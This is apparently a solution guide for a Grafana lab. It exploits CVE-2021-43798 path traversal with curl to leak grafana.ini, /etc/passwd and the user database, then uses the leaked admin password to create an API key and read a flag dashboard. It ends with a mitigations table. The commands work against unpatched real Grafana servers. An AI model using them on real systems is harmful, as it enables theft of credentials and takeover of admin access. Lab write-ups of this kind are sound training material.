# grafana-lab — Solution

> **Spoilers ahead.** Try the lab cold first.

## Overview

TeleDash is a fictional monitoring platform running Grafana 8.2.6 on port 3001.
The attack chain:

1. **Recon** — fingerprint Grafana, find the version
2. **CVE-2021-43798** — unauthenticated path traversal leaks `grafana.ini`
3. **Credential use** — login as admin with the leaked password
4. **Flag** — read the provisioned internal ops dashboard

---

## Step 1 — Recon

```bash
curl http://localhost:3001/api/health
# {"commit":"c3cc4da7a5","database":"ok","version":"8.2.6"}
```

Version 8.2.6 → vulnerable to CVE-2021-43798 (affects 8.0.0–8.3.0).

Visiting `http://localhost:3001/` shows the Grafana login page — no anonymous access.

---

## Step 2 — Path traversal (CVE-2021-43798)

Grafana 8.x serves static files from plugin directories via
`/public/plugins/<plugin-id>/`. There is no sanitisation of `../` sequences,
so an attacker can traverse from a plugin folder to the root of the filesystem.

**Find a valid plugin id** — any default plugin works:
`alertlist`, `graph`, `table`, `text`, `prometheus`, `mysql` etc.

```bash
# Leak grafana.ini — contains admin credentials
curl --path-as-is \
  'http://localhost:3001/public/plugins/alertlist/../../../../../../../../../etc/grafana/grafana.ini'
```

Key output:
```ini
admin_user = admin
admin_password = T3l3m3trics2021!
secret_key = SW2YcwTIb9zpOOhoPsMm
```

**Other useful files to traverse:**
```bash
# OS users
curl --path-as-is 'http://localhost:3001/public/plugins/graph/../../../../../../../../../etc/passwd'

# Grafana SQLite DB (contains all users, API keys, dashboard JSON)
curl --path-as-is \
  'http://localhost:3001/public/plugins/table/../../../../../../../../../var/lib/grafana/grafana.db' \
  -o grafana.db
# Then: sqlite3 grafana.db "SELECT login,password,email FROM user;"
```

---

## Step 3 — Authenticate as admin

Using the leaked password directly in the UI or via API:

```bash
# Create an admin API key
curl -s -X POST http://localhost:3001/api/auth/keys \
  -H "Content-Type: application/json" \
  -u "admin:T3l3m3trics2021!" \
  -d '{"name":"pentest","role":"Admin"}'
# -> {"id":1,"name":"pentest","key":"eyJr..."}
```

Or just log in at `http://localhost:3001/` with `admin` / `T3l3m3trics2021!`.

---

## Step 4 — Read the flag dashboard

List available dashboards:
```bash
curl -s -H "Authorization: Bearer <API_KEY>" http://localhost:3001/api/search
# -> [{"title":"TeleDash Ops","url":"/d/teledash-ops-001/teledash-ops",...}]
```

Read the dashboard:
```bash
curl -s -H "Authorization: Bearer <API_KEY>" \
  http://localhost:3001/api/dashboards/uid/teledash-ops-001
```

The "Credentials — INTERNAL ONLY" panel contains the flag:

**🏁 `FLAG{grafana_path_traversal_cve_2021_43798}`**

---

## Why `--path-as-is` matters

By default `curl` normalises `../` sequences before sending. Without
`--path-as-is`, the traversal path gets collapsed and the request hits a
valid plugin path, returning a 200 with plugin assets instead of the target
file. Always pass `--path-as-is` (or use Burp/raw HTTP) for path traversal.

---

## Mitigations

| Issue | Fix |
|---|---|
| CVE-2021-43798 | Upgrade to Grafana ≥ 8.3.1 |
| Admin password in ini file | Use `GF_SECURITY_ADMIN_PASSWORD` env var only (never commit ini to repo) |
| Sensitive data in dashboard | Store secrets in a vault, not in Grafana text panels |
| Unauth `/api/health` version disclosure | Restrict health endpoint behind auth or a WAF rule |
